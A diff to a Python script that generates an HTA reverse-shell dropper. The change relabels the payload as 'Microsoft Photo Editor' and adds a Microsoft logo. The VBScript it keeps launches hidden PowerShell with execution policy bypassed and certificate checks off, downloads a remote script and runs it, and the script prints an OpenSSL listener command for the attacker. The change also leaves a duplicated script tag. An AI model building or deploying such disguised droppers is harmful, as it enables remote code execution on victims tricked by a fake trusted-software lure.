@@ -254,45 +254,32 @@ def generate_hta_with_encoded_ps1(server_url, output_file):
     hta_content = f"""
 <html>
 <head>
-    <title>HTA Reverse Shell</title>
+    <title>Microsoft Photo Editor</title>
     <HTA:APPLICATION 
-        APPLICATIONNAME="HTA Reverse Shell"
-        BORDER="thin"
-        SCROLL="no"
-        SINGLEINSTANCE="yes"
-        SYSMENU="no"
-        WINDOWSTATE="minimize">
+        id="htaExample"
+        applicationname="Photo Editor"
+        border="none"
+        sysmenu="no"
+        scroll="no"
+        singleinstance="yes"
+	/>
 </head>
 <body>
 <script language="VBScript">
-    Dim objXMLHttp, objShell, serverURL
-    serverURL = "{server_url}"
-    
-    Set objXMLHttp = CreateObject("MSXML2.ServerXMLHTTP.6.0")
-    
-    objXMLHttp.Open "GET", serverURL, False
-    
-    objXMLHttp.setOption 2, 13056 ' 13056 = Ignore SSL errors
-    
-    objXMLHttp.setRequestHeader "User-Agent", "Mozilla/5.0"
-    
-    objXMLHttp.Send
-    
-    Dim ps1Content
-    ps1Content = objXMLHttp.responseText
-    
-    Set objShell = CreateObject("WScript.Shell")
-    
+<script language="VBScript">
+	Dim objShell
+	Set objShell = CreateObject("WScript.Shell")
+
+' PowerShell command to run in hidden mode
 command = "powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command " & _
           "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {{ $true }}; " & _
           "$ps1 = (New-Object System.Net.WebClient).DownloadString('""" + server_url + """'); " & _
           "Invoke-Expression $ps1"
-              
-    objShell.Run command, 0, True
 
-    Set objShell = Nothing
-    Set objXMLHttp = Nothing
+objShell.Run command, 0, True
+
 </script>
+<img src="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b?ver=5c31" alt="Microsoft">
 </body>
 </html>
     """
@@ -354,4 +341,4 @@ if __name__ == "__main__":
         generate_vbs_with_encoded_ps1(args.server, output_file)
 
     print(f"{Fore.CYAN}To start an OpenSSL listener, run:\n{Fore.GREEN}openssl s_server -accept {args.port} -cert {cert_file} -key {key_file} -quiet{Style.RESET_ALL}")
-
+    
